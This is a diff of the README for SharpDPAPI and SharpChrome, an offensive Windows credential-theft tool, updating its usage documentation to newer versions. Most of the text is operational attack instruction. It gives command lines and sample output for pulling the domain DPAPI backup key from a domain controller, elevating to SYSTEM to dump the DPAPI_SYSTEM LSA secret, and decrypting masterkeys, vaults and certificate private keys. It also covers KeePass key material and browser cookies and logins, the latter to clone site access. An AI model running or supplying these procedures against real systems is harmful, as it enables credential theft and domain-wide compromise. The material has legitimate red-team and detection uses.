@@ -22,57 +22,60 @@ SharpDPAPI is licensed under the BSD 3-Clause license.
 ## Table of Contents
 
 - [SharpDPAPI](#sharpdpapi)
-  * [Table of Contents](#table-of-contents)
-  * [Background](#background)
+  - [Table of Contents](#table-of-contents)
+  - [Background](#background)
       - [SharpDPAPI Command Line Usage](#sharpdpapi-command-line-usage)
       - [SharpChrome Command Line Usage](#sharpchrome-command-line-usage)
-    + [Operational Usage](#operational-usage)
+    - [Operational Usage](#operational-usage)
       - [SharpDPAPI](#sharpdpapi-1)
       - [SharpChrome](#sharpchrome)
-    + [Cobalt Strike Usage](#cobalt-strike-usage)
-  * [SharpDPAPI Commands](#sharpdpapi-commands)
-    + [User Triage](#user-triage)
+  - [SharpDPAPI Commands](#sharpdpapi-commands)
+    - [User Triage](#user-triage)
       - [masterkeys](#masterkeys)
       - [credentials](#credentials)
       - [vaults](#vaults)
       - [rdg](#rdg)
+      - [keepass](#keepass)
       - [certificates](#certificates)
       - [triage](#triage)
-    + [Machine Triage](#machine-triage)
+    - [Machine Triage](#machine-triage)
       - [machinemasterkeys](#machinemasterkeys)
       - [machinecredentials](#machinecredentials)
       - [machinevaults](#machinevaults)
-      - [machinecerts](#machinecerts)
+      - [certificates /machine](#certificates-machine)
       - [machinetriage](#machinetriage)
-    + [Misc](#misc)
+    - [Misc](#misc)
       - [ps](#ps)
-      - [blob](#ps)
+      - [blob](#blob)
       - [backupkey](#backupkey)
-  * [SharpChrome Commands](#sharpchrome-commands)
-    + [logins](#logins)
-    + [cookies](#cookies)
-    + [statekeys](#statekeys)
-    + [backupkey](#backupkey-1)
-  * [Compile Instructions](#compile-instructions)
-    + [Targeting other .NET versions](#targeting-other-net-versions)
-    + [Sidenote: Running SharpDPAPI Through PowerShell](#sidenote-running-sharpdpapi-through-powershell)
+      - [search](#search)
+  - [SharpChrome Commands](#sharpchrome-commands)
+    - [logins](#logins)
+    - [cookies](#cookies)
+    - [statekeys](#statekeys)
+    - [backupkey](#backupkey-1)
+  - [Compile Instructions](#compile-instructions)
+    - [Targeting other .NET versions](#targeting-other-net-versions)
+    - [Sidenote: Running SharpDPAPI Through PowerShell](#sidenote-running-sharpdpapi-through-powershell)
+      - [Sidenote Sidenote: Running SharpDPAPI Over PSRemoting](#sidenote-sidenote-running-sharpdpapi-over-psremoting)
 
 
 ## Background
 
 #### SharpDPAPI Command Line Usage
 
+
       __                 _   _       _ ___
      (_  |_   _. ._ ._  | \ |_) /\  |_) |
      __) | | (_| |  |_) |_/ |  /--\ |  _|_
                     |
-      v1.9.0
+      v1.11.0
 
 
 
     Retrieve a domain controller's DPAPI backup key, optionally specifying a DC and output file:
 
-      SharpDPAPI backupkey [/server:SERVER.domain] [/file:key.pvk]
+      SharpDPAPI backupkey [/nowrap] [/server:SERVER.domain] [/file:key.pvk]
 
 
     The *search* comand will search for potential DPAPI blobs in the registry, files, folders, and base64 blobs:
@@ -88,18 +91,21 @@ SharpDPAPI is licensed under the BSD 3-Clause license.
         machinemasterkeys       -   triage all reachable machine masterkey files (elevates to SYSTEM to retrieve the DPAPI_SYSTEM LSA secret)
         machinecredentials      -   use 'machinemasterkeys' and then triage machine Credential files
         machinevaults           -   use 'machinemasterkeys' and then triage machine Vaults
-        machinecerts            -   use 'machinemasterkeys' and then triage machine certificate stores
         machinetriage           -   run the 'machinecredentials' and 'machinevaults' commands
 
 
     User Triage:
 
-        Triage all reachable user masterkey files, use a domain backup key to decrypt all that are found:
+        Arguments for the 'masterkeys' command:
 
-          SharpDPAPI masterkeys </pvk:BASE64... | /pvk:key.pvk>
+            /target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
+            /pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
+            /pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
+            /password:X             -   first decrypt the current user's masterkeys using a plaintext password (works remotely)
+            /server:SERVER          -   triage a remote server, assuming admin access
 
 
-        Arguments for the certificates|credentials|vaults|rdg|triage|blob|ps commands:
+        Arguments for the credentials|vaults|rdg|keepass|triage|blob|ps commands:
 
             Decryption:
                 /unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
@@ -112,12 +118,22 @@ SharpDPAPI is licensed under the BSD 3-Clause license.
             Targeting:
                 /target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
                 /server:SERVER      -   triage a remote server, assuming admin access
-                                        Note: must use with /pvk:KEY
+                                        Note: must use with /pvk:KEY or /password:X
                                         Note: not applicable to 'blob' or 'ps' commands
+
+
+    Certificate Triage:
+
+        Arguments for the 'certificates' command:
+            /showall                                        -   show all decrypted private key files, not just ones that are linked to installed certs (the default)
+            /machine                                        -   use the local machine store for certificate triage
+            /mkfile | /target                               -   for /machine triage
+            /pvk | /mkfile | /password | /server | /target  -   for user triage
 
 
     Note: in most cases, just use *triage* if you're targeting user DPAPI secrets and *machinetriage* if you're going after SYSTEM DPAPI secrets.
           These functions wrap all the other applicable functions that can be automatically run.
+
 
 
 #### SharpChrome Command Line Usage
@@ -131,7 +147,7 @@ SharpDPAPI is licensed under the BSD 3-Clause license.
 
     Retrieve a domain controller's DPAPI backup key, optionally specifying a DC and output file:
 
-      SharpChrome backupkey [/server:SERVER.domain] [/file:key.pvk]
+      SharpChrome backupkey [/nowrap] [/server:SERVER.domain] [/file:key.pvk]
 
 
     Global arguments for the 'cookies', 'logins', and 'statekeys' commands:
@@ -147,6 +163,7 @@ SharpDPAPI is licensed under the BSD 3-Clause license.
 
         Targeting:
             /target:FILE        -   triage a specific 'Cookies', 'Login Data', or 'Local State' file location
+            /target:C:\Users\X\ -   triage a specific user folder for any specified command
             /server:SERVER      -   triage a remote server, assuming admin access (note: must use with /pvk:KEY)
             /browser:X          -   triage 'chrome' (the default) or (chromium-based) 'edge'
 
@@ -188,21 +205,14 @@ SharpChrome is a Chrome-specific implementation of SharpDPAPI capable of **cooki
 
 Since Chrome Cookies/Login Data are saved without CRYPTPROTECT_SYSTEM, CryptUnprotectData() is back on the table. If SharpChrome is run from an unelevated contect, it will attempt to decrypt any logins/cookies for the current user using CryptUnprotectData(). A `/pvk:[BASE64|file.pvk]`, {GUID}:SHA1 lookup table, `/password:X`, or `/mkfile:FILE` of {GUID}:SHA1 values can also be used to decrypt values. Also, the [C# SQL library](https://github.com/akveo/digitsquare/tree/a251a1220ef6212d1bed8c720368435ee1bfdfc2/plugins/com.brodysoft.sqlitePlugin/src/wp) used (with a few modifications) supports [lockless opening](https://github.com/gentilkiwi/mimikatz/pull/199), meaning that Chrome does not have to be closed/target files do not have to be copied to another location.
 
-If Chrome is version 80+, an AES state key is stored in *AppData\Local\Google\Chrome\User Data\Local State* - this key is protected with DPAPI, so we can use CryptUnprotectData()/pvk/masterkey lookup tables to decrypt it. This AES key is then used to protect new cookie and login data entries. This is also the process when `/browser:edge` is specified, for newer Chromium-based Edge browser triage.
+If Chrome is version 80+, an AES state key is stored in *AppData\Local\Google\Chrome\User Data\Local State* - this key is protected with DPAPI, so we can use CryptUnprotectData()/pvk/masterkey lookup tables to decrypt it. This AES key is then used to protect new cookie and login data entries. This is also the process when `/browser:edge` or `/browser:brave` is specified, for newer Chromium-based Edge browser triage.
 
 By default, cookies and logins are displayed as a csv - this can be changed with `/format:table` for table output, and `/format:json` for cookies specifically. The json option outputs cookies in a json format that can be imported into the [EditThisCookie](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=en) Chrome extension for easy reuse.
 
 The **cookies** command also has `/cookie:REGEX` and `/url:REGEX` arguments to only return cookie names or urls matching the supplied regex. This is useful with `/format:json` to easily clone access to specific sites.
 
-### Cobalt Strike Usage
+Specific cookies/logins/statekey files can be specified with `/target:X`, and a user folder can be specified with `/target:C:\Users\USER\` for any triage command.
 
-SharpDPAPI has an Aggressor script (**SharpDPAPI.cna**) that automates the usage of SharpDPAPI through Cobalt Strike. Before usage, replace `$SharpDPAPI::AssemblyPath` in the .cna with the location of your compiled SharpDPAPI assembly.
-
-Loading **SharpDPAPI.cna** will register a new **sharpDPAPI** Beacon command. If **beacon> sharpDPAPI -dump** is run, the current Beacon will execute `sekurlsa::dpapi` Mimikatz command to extract any DPAPI keys from LSASS (assuming elevation) followed by `dpapi::cache` to display the {GUID}:SHA1 mappings. The decrypted master key SHA1s are stored in the credential store.
-
-Running **beacon> sharpDPAPI** will execute SharpDPAPI with the `triage` command with any GUID:SHA1 masterkey mappings extracted for that host. This allows for effective triage of all Credentials and Vaults on a host _for any currently logged in users_.
-
-_TODO: implement machine key triage functions in SharpDPAPI.cna_
 
 ## SharpDPAPI Commands
 
@@ -605,106 +615,155 @@ Using a domain DPAPI backup key to first decrypt any discoverable masterkeys:
                 Password   : Password123!
 
 
+#### keepass
+
+The **keepass** command will search for KeePass ProtectedUserKey.bin files for the current user (or if elevated, all users) and either a) decrypt them with any "{GUID}:SHA1" masterkeys passed, b) a `/mkfile:FILE` of one or more {GUID}:SHA1 masterkey mappings, c) use a supplied DPAPI domain backup key (`/pvk:BASE64...` or `/pvk:key.pvk`) to first decrypt any user masterkeys (a la **masterkeys**), or d) a `/password:X` to decrypt any user masterkeys which are then used as a lookup decryption table. DPAPI GUID mappings can be recovered with Mimikatz' `sekurlsa::dpapi` command.
+
+The `/unprotect` flag will use CryptUnprotectData() to decrypt the key bytes, *if* the command is run from the user context who saved the passwords. This can be done from an _unprivileged_ context, without the need to touch LSASS. For why this approach isn't used for credentials/vaults, see Benjamin's [documentation here](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials#problem).
+
+A specific ProtectedUserKey.bin file, .RDC file (or folder of .RDG files) can be specified with `/target:FILE` or `/target:C:\Folder\`. If a file is specified, {GUID}:SHA1 values (or `/unprotect`) are required, and if a folder is specified either a) {GUID}:SHA1 values must be supplied or b) the folder must contain DPAPI masterkeys and a /pvk domain backup key must be supplied.
+
+Decrypted key file bytes can be used with the [modified KeePass version in KeeThief](https://github.com/GhostPack/KeeThief/tree/master/KeePass-2.34-Source-Patched).
+
+Using `/unprotect` to decrypt any found key material:
+
+    C:\Temp> SharpDPAPI.exe  keepass /unprotect
+
+      __                 _   _       _ ___
+     (_  |_   _. ._ ._  | \ |_) /\  |_) |
+     __) | | (_| |  |_) |_/ |  /--\ |  _|_
+                    |
+      v1.10.0
+
+
+    [*] Action: KeePass Triage
+
+    [*] Using CryptUnprotectData() for decryption.
+
+    [*] Triaging KeePass ProtectedUserKey.bin files for current user
+
+        File             : C:\Users\harmj0y\AppData\Roaming\KeePass\ProtectedUserKey.bin
+        Accessed         : 3/1/2021 1:38:22 PM
+        Modified         : 1/4/2021 5:49:49 PM
+        guidMasterKey    : {dab90445-0a08-4b27-9110-b75d4a7894d0}
+        size             : 210
+        flags            : 0x0
+        algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
+        description      :
+        Key Bytes        : 39 2E 63 EF 0E 37 E8 5C 34 ...
+
+
+    SharpDPAPI completed in 00:00:00.0566660
+
+
 #### certificates
 
 The **certificates** command will search user encrypted DPAPI certificate private keys a) decrypt them with any "{GUID}:SHA1" masterkeys passed, b) a `/mkfile:FILE` of one or more {GUID}:SHA1 masterkey mappings, c) use a supplied DPAPI domain backup key (`/pvk:BASE64...` or `/pvk:key.pvk`) to first decrypt any user masterkeys (a la **masterkeys**), or d) a `/password:X` to decrypt any user masterkeys, which are then used as a lookup decryption table. DPAPI GUID mappings can be recovered with Mimikatz' `sekurlsa::dpapi` command.
 
 A specific certificiate can be specified with `/target:C:\Folder\`. In this case, either a) {GUID}:SHA1 values must be supplied or b) the folder must contain DPAPI masterkeys and a /pvk domain backup key must be supplied.
 
+By default, only private keys linkable to an associated installed certificate are displayed. The `/showall` command will display ALL decrypted private keys.
+
+Use the `/cng` flag for CNG private keys (default is capi).
+
 Using domain {GUID}:SHA1 masterkey mappings:
 
-    C:\Temp>SharpDPAPI.exe certificates {2fd105b7-ec31-4f33-969e-f57c16d8e718}:79097C8...
+    C:\Temp> SharpDPAPI.exe certificates {dab90445-0a08-4b27-9110-b75d4a7894d0}:C23AF7432EB513717AA...(snip)...
 
       __                 _   _       _ ___
      (_  |_   _. ._ ._  | \ |_) /\  |_) |
      __) | | (_| |  |_) |_/ |  /--\ |  _|_
                     |
-      v1.7.0
+      v1.10.0
 
 
-    [*] Action: Cert Triage
+    [*] Action: Certificate Triage
 
-    Certificate file           : 824020b98d4a03d0d23392fb673067eb_6c712ef3-1467-4f96-bb5c-6737ba66cfb0
+    Folder       : C:\Users\harmj0y\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-937929760-3187473010-80948926-1104
 
-        Private Key GUID    : {DEB1D7E1-DA7B-4C99-A8F1-F1A532B4BA0E}
-        Magic Header: RSA1
-        Len1: 264
-        Bitlength: 2048
-        UNK: 255
-        Pubexp: 65537
-        GuidProvider GUID is {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
-        Master Key GUID is {2fd105b7-ec31-4f33-969e-f57c16d8e718}
-        Description: CryptoAPI Private Key
-        algCrypt: CALG_3DES
-        keyLen: 192
-        Salt: d58a77d4b817a366a179b1eaa5b9f797
-        algHash: CALG_SHA
-        Hashlen: 160
-        HMAC: e4fa2d8144af651a86de20efa5771d20
+      File               : 34eaff3ec61d0f012ce1a0cb4c10c053_6c712ef3-1467-4f96-bb5c-6737ba66cfb0
 
-    [*] Private key file 824020b98d4a03d0d23392fb673067eb_6c712ef3-1467-4f96-bb5c-6737ba66cfb0 was recovered
+        Provider GUID    : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
+        Master Key GUID  : {dab90445-0a08-4b27-9110-b75d4a7894d0}
+        Description      : CryptoAPI Private Key
+        algCrypt         : CALG_3DES (keyLen 192)
+        algHash          : CALG_SHA (32772)
+        Salt             : ef98458bca7135fe1bb89b3715180ae6
+        HMAC             : 5c3c3da2a4f6548a0186c22f86d7bc85
+        Unique Name      : te-UserMod-8c8e0236-76ca-4a36-b4d5-24eaf3c3e1da
 
-    [*] PKCS1 Private key
+        Thumbprint       : 98A03BC583861DCC19045758C0E0C05162091B6C
+        Issuer           : CN=theshire-DC-CA, DC=theshire, DC=local
+        Subject          : CN=harmj0y
+        Valid Date       : 2/22/2021 2:19:02 PM
+        Expiry Date      : 2/22/2022 2:19:02 PM
+        Enhanced Key Usages:
+            Client Authentication (1.3.6.1.5.5.7.3.2)
+             [!] Certificate is used for client auth!
+            Secure Email (1.3.6.1.5.5.7.3.4)
+            Encrypting File System (1.3.6.1.4.1.311.10.3.4)
+
+        [*] Private key file 34eaff3ec61d0f012ce1a0cb4c10c053_6c712ef3-1467-4f96-bb5c-6737ba66cfb0 was recovered:
 
     -----BEGIN RSA PRIVATE KEY-----
-    MIIEpAIBAAKCAQEAtt/LpUFCjeE2YBmwvhkAI2R8DfX...(snip)...
+    MIIEpAIBAAKCAQEA0WDgv/jH5HuATtPgQSBie5t...(snip)...
     -----END RSA PRIVATE KEY-----
-
-    [*] Certificate
-
     -----BEGIN CERTIFICATE-----
-    MIIC1jCCAb6gAwIBAgIQfSNOUmInprRC0lEVt7u...(snip)...
+    MIIFujCCBKKgAwIBAgITVQAAAJf6yKyhm5SBVwA...(snip)...
     -----END CERTIFICATE-----
 
 
 Using a domain DPAPI backup key to first decrypt any discoverable masterkeys:
 
-    C:\Temp>SharpDPAPI.exe certificates /pvk:HvG1sAAAAAABAAAAAAAAAAAAAAC...(snip)...
+    C:\Temp>SharpDPAPI.exe certificates /pvk:HvG1sAAAAAABAAAAAAAAAAAAAACU...(snip)...
       __                 _   _       _ ___
      (_  |_   _. ._ ._  | \ |_) /\  |_) |
      __) | | (_| |  |_) |_/ |  /--\ |  _|_
                     |
-      v1.7.0
+      v1.10.0
 
 
-    [*] Action: Cert Triage
+    [*] Action: Certificate Triage
     [*] Using a domain DPAPI backup key to triage masterkeys for decryption key mappings!
+
 
     [*] User master key cache:
 
-    {2fd105b7-ec31-4f33-969e-f57c16d8e718}:79097C8...
-    ...(snip)...
+    {dab90445-0a08-4b27-9110-b75d4a7894d0}:C23AF7432EB51371...(snip)...
 
-    Certificate file           : 824020b98d4a03d0d23392fb673067eb_6c712ef3-1467-4f96-bb5c-6737ba66cfb0
 
-        Private Key GUID    : {DEB1D7E1-DA7B-4C99-A8F1-F1A532B4BA0E}
-        Magic Header: RSA1
-        Len1: 264
-        Bitlength: 2048
-        UNK: 255
-        Pubexp: 65537
-        GuidProvider GUID is {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
-        Master Key GUID is {2fd105b7-ec31-4f33-969e-f57c16d8e718}
-        Description: CryptoAPI Private Key
-        algCrypt: CALG_3DES
-        keyLen: 192
-        Salt: d58a77d4b817a366a179b1eaa5b9f797
-        algHash: CALG_SHA
-        Hashlen: 160
-        HMAC: e4fa2d8144af651a86de20efa5771d20
 
-    [*] Private key file 824020b98d4a03d0d23392fb673067eb_6c712ef3-1467-4f96-bb5c-6737ba66cfb0 was recovered
+    Folder       : C:\Users\harmj0y\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-937929760-3187473010-80948926-1104
 
-    [*] PKCS1 Private key
+      File               : 34eaff3ec61d0f012ce1a0cb4c10c053_6c712ef3-1467-4f96-bb5c-6737ba66cfb0
+
+        Provider GUID    : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
+        Master Key GUID  : {dab90445-0a08-4b27-9110-b75d4a7894d0}
+        Description      : CryptoAPI Private Key
+        algCrypt         : CALG_3DES (keyLen 192)
+        algHash          : CALG_SHA (32772)
+        Salt             : ef98458bca7135fe1bb89b3715180ae6
+        HMAC             : 5c3c3da2a4f6548a0186c22f86d7bc85
+        Unique Name      : te-UserMod-8c8e0236-76ca-4a36-b4d5-24eaf3c3e1da
+
+        Thumbprint       : 98A03BC583861DCC19045758C0E0C05162091B6C
+        Issuer           : CN=theshire-DC-CA, DC=theshire, DC=local
+        Subject          : CN=harmj0y
+        Valid Date       : 2/22/2021 2:19:02 PM
+        Expiry Date      : 2/22/2022 2:19:02 PM
+        Enhanced Key Usages:
+            Client Authentication (1.3.6.1.5.5.7.3.2)
+             [!] Certificate is used for client auth!
+            Secure Email (1.3.6.1.5.5.7.3.4)
+            Encrypting File System (1.3.6.1.4.1.311.10.3.4)
+
+        [*] Private key file 34eaff3ec61d0f012ce1a0cb4c10c053_6c712ef3-1467-4f96-bb5c-6737ba66cfb0 was recovered:
 
     -----BEGIN RSA PRIVATE KEY-----
-    MIIEpAIBAAKCAQEAtt/LpUFCjeE2YBmwvhkAI2R8DfX...(snip)...
+    MIIEpAIBAAKCAQEA0WDgv/jH5HuATtPgQSBie5t...(snip)...
     -----END RSA PRIVATE KEY-----
-
-    [*] Certificate
-
     -----BEGIN CERTIFICATE-----
-    MIIC1jCCAb6gAwIBAgIQfSNOUmInprRC0lEVt7u...(snip)...
+    MIIFujCCBKKgAwIBAgITVQAAAJf6yKyhm5SBVwA...(snip)...
     -----END CERTIFICATE-----
 
 
@@ -853,35 +912,35 @@ Local administrative rights are needed (so we can retrieve the DPAPI_SYSTEM LSA 
     ...(snip)...
 
 
-#### machinecerts
+#### certificates /machine
 
-The **machinecerts** command will elevated to SYSTEM to retrieve the DPAPI_SYSTEM LSA secret which is then used to decrypt any found machine DPAPI masterkeys. These keys are then used to decrypt any found machine system encrypted DPAPI private certificate keys.
+The **certificates /machine** command will use the machine certificate store to look for decryptable machine certificate private keys. `/mkfile:X` and `{GUID}:masterkey` are usable with the `/target:\[file|folder\]` command, otherwise SharpDPAPI will elevate to SYSTEM to retrieve the DPAPI_SYSTEM LSA secret which is then used to decrypt any found machine DPAPI masterkeys. These keys are then used to decrypt any found machine system encrypted DPAPI private certificate keys.
+
+By default, only private keys linkable to an associated installed certificate are displayed. The `/showall` command will display ALL decrypted private keys.
 
 Local administrative rights are needed (so we can retrieve the DPAPI_SYSTEM LSA secret).
 
-    C:\Temp>SharpDPAPI.exe machinecerts
+    C:\Temp>SharpDPAPI.exe certificates /machine
 
       __                 _   _       _ ___
      (_  |_   _. ._ ._  | \ |_) /\  |_) |
      __) | | (_| |  |_) |_/ |  /--\ |  _|_
                     |
-      v1.7.0
+      v1.10.0
 
 
-    [*] Action: Machine DPAPI Certificate Triage
-
+    [*] Action: Certificate Triage
     [*] Elevating to SYSTEM via token duplication for LSA secret retrieval
     [*] RevertToSelf()
-
 
     [*] Secret  : DPAPI_SYSTEM
     [*]    full: DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF6C88CEFD23D0291FA9FE46899D4DE12A180E76C3
     [*]    m/u : DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF / 6C88CEFD23D0291FA9FE46899D4DE12A180E76C3
 
+
     [*] SYSTEM master key cache:
 
-    {3c1fb9fb-aabe-4c45-aab9-c3e1b614776d}:4E4193B4C4D2F0420E0656B5F83D03754B565A0C
-    ...(snip)...
+    {f12f57e1-dd41-4daa-88f1-37a64034c7e9}:3AEB121ECF2...(snip)...
 
 
     [*] Triaging System Certificates
@@ -889,43 +948,40 @@ Local administrative rights are needed (so we can retrieve the DPAPI_SYSTEM LSA 
 
     Folder       : C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys
 
+      File               : 9377cea385fa1e5bf7815ee2024d0eea_6c712ef3-1467-4f96-bb5c-6737ba66cfb0
 
-    Certificate file           : fad662b360941f26a1193357aab3c12d_6c712ef3-1467-4f96-bb5c-6737ba66cfb0
+        Provider GUID    : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
+        Master Key GUID  : {f12f57e1-dd41-4daa-88f1-37a64034c7e9}
+        Description      : CryptoAPI Private Key
+        algCrypt         : CALG_3DES (keyLen 192)
+        algHash          : CALG_SHA (32772)
+        Salt             : aa8c9e4849455660fc5fc96589f3e40e
+        HMAC             : 9138559ef30fbd70808dca2c1ed02a29
+        Unique Name      : te-Machine-50500b00-fddb-4a0d-8aa6-d73404473650
 
-        Private Key GUID    : IIS Express Development Certificate Container
-        Magic Header: RSA1
-        Len1: 264
-        Bitlength: 2048
-        UNK: 255
-        Pubexp: 65537
-        GuidProvider GUID is {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
-        Master Key GUID is {3c1fb9fb-aabe-4c45-aab9-c3e1b614776d}
-        Description: CryptoAPI Private Key
-        algCrypt: CALG_AES_256
-        keyLen: 256
-        Salt: daa3d225ba280029a6169495bbdb3182c75f659ffcd1352ee845e830621fbc08
-        algHash: CALG_SHA_512
-        Hashlen: 512
-        HMAC: 93519cb9b6bbdf409909b3ee78dc1d783ab5db273bf796d9f9f77ea8ba2f64b3
+        Thumbprint       : A82ED8207DF6BC16BB65BF6A91E582263E217A4A
+        Issuer           : CN=theshire-DC-CA, DC=theshire, DC=local
+        Subject          : CN=dev.theshire.local
+        Valid Date       : 2/22/2021 3:50:43 PM
+        Expiry Date      : 2/22/2022 3:50:43 PM
+        Enhanced Key Usages:
+            Client Authentication (1.3.6.1.5.5.7.3.2)
+             [!] Certificate is used for client auth!
+            Server Authentication (1.3.6.1.5.5.7.3.1)
 
-    [*] Private key file fad662b360941f26a1193357aab3c12d_6c712ef3-1467-4f96-bb5c-6737ba66cfb0 was recovered
-
-    [*] PKCS1 Private key
+        [*] Private key file 9377cea385fa1e5bf7815ee2024d0eea_6c712ef3-1467-4f96-bb5c-6737ba66cfb0 was recovered:
 
     -----BEGIN RSA PRIVATE KEY-----
-    MIIEogIBAAKCAQEApSg1h2MH3lK39ZoFrj1tz5...(snip)...
+    MIIEpAIBAAKCAQEAzRX2ipgM1t9Et4KoP...(snip)...
     -----END RSA PRIVATE KEY-----
-
-    [*] Certificate
-
     -----BEGIN CERTIFICATE-----
-    MIIC1jCCAb6gAwIBAgIQfSNOUmInprRC0lEVt7u...(snip)...
+    MIIFOjCCBCKgAwIBAgITVQAAAJqDK8j15...(snip)...
     -----END CERTIFICATE-----
-    
+
 
 #### machinetriage
 
-The **machinetriage** command runs the user [machinecredentials](#machinecredentials), [machinevaults](#machinevaults), and [machinecerts](#machinecerts) commands.
+The **machinetriage** command runs the user [machinecredentials](#machinecredentials), [machinevaults](#machinevaults), and [certificates /machine](#certificates--machine) commands.
 
 
 ### Misc
@@ -1118,6 +1174,8 @@ The **backupkey** command will retrieve the domain DPAPI backup key from a domai
 
 Domain admin (or equivalent) rights are needed to retrieve the key from a remote domain controller.
 
+The `/nowrap` flag will prevent wrapping the base64 key on display.
+
 This base64 key blob can be decoded to a binary .pvk file that can then be used with Mimikatz' **dpapi::masterkey /in:MASTERKEY /pvk:backupkey.pvk** module, or used in blob/file /pvk:X form with the **masterkeys**, **credentials**, or **vault** SharpDPAPI commands.
 
 By default, SharpDPAPI will try to determine the current domain controller via the **DsGetDcName** API call. A server can be specified with `/server:COMPUTER.domain.com`. If you want the key saved to disk instead of output as a base64 blob, use `/file:key.pvk`.
@@ -1227,6 +1285,8 @@ If run from an elevated context, state keys for ALL users will be triaged, other
 The **backupkey** command will retrieve the domain DPAPI backup key from a domain controller using the **LsaRetrievePrivateData** API approach [from Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/2fd09bbef0754317cd97c01dbbf49698ae23d9d2/mimikatz/modules/kuhl_m_lsadump.c#L1882-L1927). This private key can then be used to decrypt master key blobs for any user on the domain. And even better, the key never changes ;)
 
 Domain admin (or equivalent) rights are needed to retrieve the key from a remote domain controller.
+
+The `/nowrap` flag will prevent wrapping the base64 key on display.
 
 This base64 key blob can be decoded to a binary .pvk file that can then be used with Mimikatz' **dpapi::masterkey /in:MASTERKEY /pvk:backupkey.pvk** module, or used in blob/file /pvk:X form with the **masterkeys**, **credentials**, or **vault** SharpDPAPI commands.
 
